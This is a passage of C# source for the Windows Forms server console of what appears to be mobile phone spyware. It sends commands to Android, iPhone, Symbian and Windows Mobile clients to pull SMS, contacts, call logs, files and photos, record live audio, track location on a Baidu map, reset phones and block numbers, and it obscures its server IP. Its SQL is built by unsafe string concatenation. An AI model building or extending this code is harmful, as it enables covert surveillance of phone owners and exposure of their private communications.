        private void listView4_DoubleClick(object sender, EventArgs e)   //文档管理列表文件双击打开
        {
           
            string filename = listView4.SelectedItems[0].SubItems[4].Text;
            System.Diagnostics.Process.Start(filename);
        }

        #endregion

        #region 检测文件夹变化的函数
        public void FileWatcher()
          { 
          FileSystemWatcher FileWatcher = new FileSystemWatcher ();
          string WatcherPath= AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile";
          FileWatcher.Filter = "*.*"; //设定监听的文件类型
          FileWatcher.Path = WatcherPath; //设定监听的目录         
              FileWatcher.Changed += new FileSystemEventHandler(FileWatcher_Changed); //Changed 事件处理
            FileWatcher.Renamed += new RenamedEventHandler(FileWatcher_Renamed);//Renamed事件处理
            FileWatcher.Created += new FileSystemEventHandler(FileWatcher_Created);//Created事件处理
            FileWatcher.Deleted += new FileSystemEventHandler(FileWatcher_Deleted);//Deleted事件处理


 
          FileWatcher.IncludeSubdirectories = true;//设置监听子目录
          FileWatcher.EnableRaisingEvents = true;//开始进行监听（其实此处是标示是否进行事件监听和抛出）

          }
          void FileWatcher_Changed(object sender, FileSystemEventArgs e)
          {
             jiazai();
          }
        void FileWatcher_Deleted(object sender, FileSystemEventArgs e)
        {
            jiazai();
        }

        void FileWatcher_Created(object sender, FileSystemEventArgs e)
        {
            jiazai();
        }

        void FileWatcher_Renamed(object sender, RenamedEventArgs e)
        {
            jiazai();
        }

        #endregion

        #region   右键删除或者键盘delete删除
        private void contextMenuStrip1_Click(object sender, EventArgs e)
        {
            contextMenuStrip1.Hide();
            DeleteFile();
        }

        private void listView4_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                DeleteFile();
            }
        }
        public void DeleteFile()
        {

            if (listView4.SelectedItems.Count != 0)
            {
                if (MessageBox.Show("确认删除？", "此删除不可恢复", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    int count = listView4.SelectedItems.Count;
                    for (int i = 0; i < count; i++)
                    {
                        string path = listView4.SelectedItems[0].SubItems[4].Text;

                        if (listView4.SelectedItems[0].SubItems[2].Text.CompareTo("文件夹") == 0) //删除整个文件夹
                        {
                            FileControl.DeleteFiles(path, true);
                            listView4.SelectedItems[0].Remove();
                        }
                        else
                        {

                            File.Delete(path);
                            listView4.SelectedItems[0].Remove();

                        }
                    }
                    
                }
            }
        }
        #endregion

        #region 一个继承TreeNode的类
        public class MyNode : TreeNode
        {
            public string mytext = null;
            public bool isLoadFiles = false;
            public MyNode(string text, bool isRoot)
            {
                mytext = text;
                if (isRoot)//这里执行是查找本机驱动器的时候执行
                {
                    //base.Text = text.Substring(0, text.LastIndexOf("\\") - 1);
                    base.Text = text; //text.Substring(0, text.LastIndexOf("\\") );
                }
                else//这里执行是查找本机文件夹以及文件的时候执行
                {
                    base.Text = text.Substring(text.LastIndexOf("\\") + 1);
                }
            }
            public string MyPath
            {
                get
                {
                    return mytext;
                }
            }
        }

        #endregion
        private void treeView2_AfterSelect_1(object sender, TreeViewEventArgs e)
        {
            SelectBefore = treeView2.SelectedNode.Text;
        }

        private void tabControl1_Selected(object sender, TabControlEventArgs e)
        {
            if (tabControl1.SelectedTab == tabPage13)
                jiazai();
        }

        private void Phone_FormClosing(object sender, FormClosingEventArgs e)
        {
              if (iface != null)
              {
                  iface.BeClose();
              
              }
              else
              {
               
              }
        }


        //查看是否有客戶端上線
        private bool clientOnlineOrNot()
        {
            if (treeView2.SelectedNode != null) {
                if (treeView2.SelectedNode.ImageIndex == 17) {
                    MessageBox.Show("客户端未上线，暂不可监听");
                    return false;
                }
            } else {
                MessageBox.Show("请选择监听的客户端");
                return false;
            }
            return true;

        }
        //根據任傷編號對任務進行解析
        private void HandleEvent(int messageNum)
        {
             SelectBefore = treeView2.SelectedNode.Text;
             string[] info = treeView2.SelectedNode.Text.Split(' ');
               
            string PhoneNum = info[0];
            string PhoneID = info[1];
            string OS = info[2];              

            string Content = null;
            string ComTime = System.DateTime.Now.ToString();
            string Flag = "Doing";
                //Mobile系统支持的命令
            if(OS.CompareTo("Mobile")==0)
            {
                if (messageNum == 1)
                    Content = "FileInfor";
                else if (messageNum == 2)
                    Content = "Message";
                else if (messageNum == 3)
                    Content = "SimPhoneNum";
                else if (messageNum == 4)
                    Content = "OutLookPhoneNum";
                else if (messageNum == 5)
                    Content = "Appointment";                 
                else if (messageNum == 6)
                    Content = "Task";
                else if (messageNum == 9)
                    Content = "CallRecord";
                else if (messageNum == 11)
                    Content = "Image";
                else if (messageNum == 8)
                {
                    Content = "Stop";
                   /* if (iface != null)
                        iface.BeClose();*/
                } else if (messageNum == 7) {
                    if (!Only()) {
                        Content = "Voice";
                        //MessageBox.Show(Content);
                        //iface = new Interface();                           //Windows Mobile的语音处理  
                        //iface.Ini(FileNow);
                        //Ini(FileNow);             //0704
                    } else {
                        MessageBox.Show("只可监听一个终端");
                    }
                }
                else if (messageNum == 10)
                {
                    ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                    set.Show();                  

                } else if(messageNum == 13) {
                    Content = "reset";
                }
                else if (messageNum == 14) {
                    Content = "location";
                }
                else
                    MessageBox.Show("此手机系统暂不支持该命令");
               
           }

                //Symbian系统支持的命令
              if (OS.CompareTo("Symbian") == 0)
              {
                 
                  if (messageNum == 2)
                      Content = "Message";
                  else if (messageNum == 3)
                      Content = "SimPhoneNum";
                  else if (messageNum == 4)
                      Content = "OutLookPhoneNum";                 
                  else if (messageNum == 9)
                      Content = "CallRecord";
                  else if (messageNum == 11)
                      Content = "Image";
                  else if (messageNum == 8)
                  {
                      Content = "Stop";                   
                  }
                  else if (messageNum == 7)
                  {
                      if (!Only())
                      {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("只可监听一个终端");
                  } else if(messageNum == 13) {
                    Content = "reset";
                  }
                  else if (messageNum == 14) {
                      Content = "location";
                  }
                  else
                      MessageBox.Show("此手机系统暂不支持该命令");
               
              }

              if (OS.CompareTo("Android") == 0)
              {
                  if (messageNum == 1)
                      Content = "FileInfor";
                  else if (messageNum == 2)
                      Content = "Message";
                  else if (messageNum == 3)
                      Content = "SimPhoneNum";
                  else if (messageNum == 4)
                      Content = "OutLookPhoneNum";
                  else if (messageNum == 5)
                      Content = "Appointment";              
                  else if (messageNum == 9)
                      Content = "CallRecord";
                  //20111220 android照相功能暂不能使用
                  /*else if (messageNum == 11)
                      Content = "Image";
                  */else if (messageNum == 8)
                  {
                      Content = "Stop";                     
                  }
                  else if (messageNum == 7)
                  {
                      if (!Only())
                      {
                          Content = "Voice";
                      }
                      else
                          MessageBox.Show("只可监听一个终端");
                  }
                  else if (messageNum == 10)
                  {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  } else if (messageNum == 12) {
                      Content = "ColorMsg";
                  }
                  else if (messageNum == 13) {
                      Content = "reset";
                  }
                  else if (messageNum == 14) {
                      Content = "location";
                  }
                  else
                      MessageBox.Show("此手机系统暂不支持该命令");

              }
              else if (OS.CompareTo("IPhone") == 0) {
                  if (messageNum == 1)
                      Content = "FileInfor";
                  else if (messageNum == 2)
                      Content = "Message";
                  else if (messageNum == 3)
                      Content = "SimPhoneNum";
                  else if (messageNum == 4)
                      Content = "OutLookPhoneNum";
                  else if (messageNum == 5)
                      Content = "Appointment";
                  else if (messageNum == 9)
                      Content = "CallRecord";
                  else if (messageNum == 11)
                      Content = "Image";
                  else if (messageNum == 8) {
                      Content = "Stop";
                  }
                  else if (messageNum == 7) {
                      if (!Only()) {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("只可监听一个终端");
                  }
                  else if (messageNum == 13) {
                      Content = "reset";
                  }
                  else if (messageNum == 14) {
                      Content = "location";
                  }
                  else if (messageNum == 10) {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  } else
                      MessageBox.Show("此手机系统暂不支持该命令");
              }
              
                if (Content != null)
                {
                    string sql = "insert into Command(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    string sql1 = "insert into ALLCommand(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql);//插入任务到“执行中”列表中
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql1);//插入任务到“全部任务”列表中                  
                    updata1();                  
                }


        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(1);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(2);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(3);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(4);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(5);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(6);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(7);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(8);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(9);
        }

        private void button10_Click(object sender, EventArgs e)
        {
            //if (!clientOnlineOrNot()) return;
            //HandleEvent(10);
            //UserInfo userInfo = new UserInfo(PhoneNum, PhoneID, OS);
            //userInfo.ShowDialog();
            ServerIP serverIP = new ServerIP();
            serverIP.ShowDialog();
        }

        private void button11_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(11);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(12);
        }
        private void button13_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(13);
        }

        private void treeView2_DoubleClick(object sender, EventArgs e)
        {
            if (treeView2.SelectedNode != null) {
                
                String text = treeView2.SelectedNode.Text;
                //MessageBox.Show(text);

                string[] info = text.Split(' ');
               
                string PhoneNum = info[0];
                string PhoneID = info[1];
                string OS = info[2];   

                UserInfo userInfo = new UserInfo(PhoneNum, PhoneID, OS);
                userInfo.ShowDialog();
            } else {
                MessageBox.Show("必需选择一个手机信息！");
            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            if (!clientOnlineOrNot()) return;
            HandleEvent(14);
        }

        private void LocTreeTimer_Tick(object sender, EventArgs e)
        {
            if (locTree)
            {
                loadingPlace(displayLoc);
                locTree = false;
            }
        }

        private void locTreeView_DBClick(object sender, MouseEventArgs e)
        {
            //这次选择的地方与上次一样
            if (locTreeView.SelectedNode != null) {
                if (cord.CompareTo(locTreeView.SelectedNode.Text) == 0) {
                    //loadingPlace(22);

                    return;
                }
                
                cord = locTreeView.SelectedNode.Text;
                //MessageBox.Show(cord);
            }
            
            //MessageBox.Show(cord);
            loadingPlace(displayLoc);
        }

        //根据相关信息生成经纬度坐标
        public String generateCord(String PhoneNum, String PhoneID, String OS, String Time, String Longitude, String Latitude)
        {
            String json = "{title:\"备注\",content:\"" + PhoneNum + "--" + PhoneID + "--" +
                    OS + "--" + Time + "\",point:\"" + Longitude + "|" + Latitude +
                    "\",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}";
            return json;
        }
        //得到位置信息，并显示最新的位置数目count个
        public void loadingPlace(int count)
        {
             
            locTreeView.Nodes.Clear();
            string PhoneNum, PhoneID, Time, OS, Latitude = "39.918117", Longitude = "116.402221";

            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            string sql = "select * from Location order by ID DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();

            //json format: {title:"备注",content:"手机EI/SI/OS/Time",point:"116.403748|39.91571",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}
            int cnt = 0;
            System.Collections.ArrayList vec = new ArrayList();

            bool inuse = false;
            //if (cord == "") inuse = true;

            while (datareader.Read() && cnt < count) {
                ++cnt;
                PhoneNum = datareader["PhoneNum"].ToString();         //IMSI号
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["ArriveTime"].ToString();
                OS = datareader["OS"].ToString();
                Latitude = datareader["Latitude"].ToString();
                Longitude = datareader["Longitude"].ToString();

                //String json = "title:\"备注\",content:\"" + PhoneNum + "--" + PhoneID + "--" + OS + "--" + Time + "\";,point:\"" + Longitude + "|" + Latitude + "\",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}";
                
                String json = generateCord(PhoneNum, PhoneID, OS, Time, Longitude, Latitude);
                vec.Add(json);

                PhoneNum = PhoneNum + "@" + PhoneID + "@" + OS + "@" + Time + "@" + Longitude + "@" + Latitude;
                locTreeView.Nodes.Add(PhoneNum);
                if (PhoneNum.CompareTo(cord) == 0) {
                    inuse = true;
                }
            }
            conn.Close();

            //当前中心的json串不存在，则新增一个
            if (inuse == false) {
                if (cord.CompareTo("") != 0) {
                    //MessageBox.Show(cord);
                    String[] array = cord.Split('@');
                    String json = generateCord(array[0], array[1], array[2], array[3], array[4], array[5]);
                    Longitude = array[4];
                    Latitude = array[5];
                    vec.Add(json);
                }
            } else {
                String[] array = cord.Split('@');
                Longitude = array[4];
                Latitude = array[5];
            }
            
            //将vec里面的位置写入地图

            if (cord.CompareTo("") == 0) {
                //默认经纬度
                Latitude = "39.918117";
                Longitude = "116.402221";
            }
            //MessageBox.Show(Longitude + "  " + Latitude);
            //var point = new BMap.Point(116.402221,39.918117);//定义一个中心点坐标
            if (vec.Count != 0) {
                changeMapSource(vec, Longitude, Latitude);
            }
           
            loadingPage();
        }

        public void changeMapSource(ArrayList array, String Longitude, String Latitude)
        {
            //if(array)
            //修改IP
            string strTxt = "";
            string sourceFile = System.AppDomain.CurrentDomain.BaseDirectory + "BaiduMap/BDMap.dat";
            StreamReader fileStream = null;
            int line = 0;
            try {
                fileStream = new StreamReader(sourceFile, System.Text.Encoding.Default);
                while (!fileStream.EndOfStream) {
                    ++line;
                    String temp = fileStream.ReadLine();
                    if (line == 34) {
                        //var point = new BMap.Point(116.402221,39.918117);//定义一个中心点坐标
                        strTxt += "var point = new BMap.Point(" + Longitude + "," + Latitude + ");//定义一个中心点坐标";
                    }
                    else if (line == 62) {
                        //{title:"备注",content:"手机EI/SI/OS",point:"116.403748|39.91571",isOpen:0,icon:{w:50,h:50,l:0,t:0,x:6,lb:5}}
                        System.Array values = array.ToArray(typeof(object));
                        for (int i = 0; i < values.Length; ++i) {
                            temp = (String)values.GetValue(i);
                            if (i < values.Length - 1) {
                                temp += ",";
                            }
                            strTxt += temp;
                            strTxt += Environment.NewLine;
                        }
                    }
                    else {
                        strTxt += temp;
                    }
                    strTxt += Environment.NewLine;
                }

                fileStream.Close();
                fileStream.Dispose();
            }
            catch {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("读源文件失败@！");
                return;
            }

            FileStream stream = null;
            sourceFile = System.AppDomain.CurrentDomain.BaseDirectory + "BaiduMap/BDMap.htm";
            try {
                stream = new FileStream(sourceFile, FileMode.Create);
                byte[] content = System.Text.Encoding.Default.GetBytes(strTxt);
                stream.Write(content, 0, content.Length);
                //stream.SetLength(0);
                stream.Flush();
                stream.Close();
            }
            catch {

                stream.Close();
                MessageBox.Show("改写地图文件失败！");
                return;
            }
        }

        private void OrderDeleteMenu(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right) {
                if (e.RowIndex >= 0) {
                    //若行已是选中状态就不再进行设置
                    if (dataGridView2.Rows[e.RowIndex].Selected == false) {
                        dataGridView2.ClearSelection();
                        dataGridView2.Rows[e.RowIndex].Selected = true;
                    }
                    //只选中一行时设置活动单元格
                    //if (dataGridView2.SelectedRows.Count == 1) {
                    //    dataGridView2.CurrentCell = dataGridView2.Rows[e.RowIndex].Cells[e.ColumnIndex];
                    //}
                    //弹出操作菜单
                    orderDeleteContextMenu.Show(MousePosition.X, MousePosition.Y);
                }
            }
        }

        private void DeleteSelectedOrder(object sender, ToolStripItemClickedEventArgs e)
        {
            if (e.ClickedItem.Text.Equals("删除")) {
                DataGridViewSelectedRowCollection selected = dataGridView2.SelectedRows;
                String IMSI, IMEI, Content, ComTime;
                //连接数据库
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                string sql_1 = "delete from Command where ";
                string sql_2 = "delete from AllCommand where ";
                OleDbCommand myCmd_1;

                //删除数据库
                foreach(DataGridViewRow row in selected) {
                    IMSI = row.Cells[0].Value.ToString();
                    IMEI = row.Cells[1].Value.ToString();
                    Content = row.Cells[2].Value.ToString();
                    ComTime = row.Cells[3].Value.ToString();
                    //MessageBox.Show(IMSI + IMEI + Content + ComTime);

                    IMEI = IMEI.Trim();
                    if (IMEI.CompareTo("") == 0) continue;

                    String suffix = "PhoneID = '" + IMEI + "' and PhoneIMSI = '" + IMSI + "' and Content = '" + Content + "' and ComTime = '" + ComTime + "'";
                    String tb_1 = sql_1 + suffix;
                    String tb_2 = sql_2 + suffix;
                    //MessageBox.Show(tb_1);

                    myCmd_1 = new OleDbCommand(tb_1, conn);
                    myCmd_1.ExecuteNonQuery();
                    myCmd_1 = new OleDbCommand(tb_2, conn);
                    myCmd_1.ExecuteNonQuery();

                }
                conn.Close();
                updata1();
                updata2();   
            }

        }

        private void label16_Click(object sender, EventArgs e)
        {

        }

        private void label19_Click(object sender, EventArgs e)
        {

        }

        private void toolStripStatusLabel3_Click(object sender, EventArgs e)
        {

        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void label24_Click(object sender, EventArgs e)
        {

        }

        private void EncryptIP_Click(object sender, EventArgs e)
        {
            //启动加密IP对话框
            EncryptIP aEncryptIP = new EncryptIP();
            aEncryptIP.ShowDialog();
        }

        private void ChangeIP_Click(object sender, EventArgs e)
        {
            //使用时先注册
            RegistDll aRegistDll = new RegistDll();
            aRegistDll.DoUpdate();

            //启动加密IP地址
            LatestServerIP aLatestServerIP = new LatestServerIP();
            aLatestServerIP.ShowDialog();
        }

        private void SendSpecifiedMsg_Click(object sender, EventArgs e)
        {
            //发送指定短信到手机
            SendSpecifiedMessage aSendSpecifiedMessage = new SendSpecifiedMessage();
            aSendSpecifiedMessage.ShowDialog();
        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            //阻止接听拨打某一个号码
            ProhibitContactANum aProhibitContactANum = new ProhibitContactANum();
            aProhibitContactANum.ShowDialog();
        }

        private void button11_Click_1(object sender, EventArgs e)
        {
            //解除禁止接听拨打某一个号码
            AllowContactANum aAllowContactANum = new AllowContactANum();
            aAllowContactANum.ShowDialog();
        }

      }
}

        
       

       
      
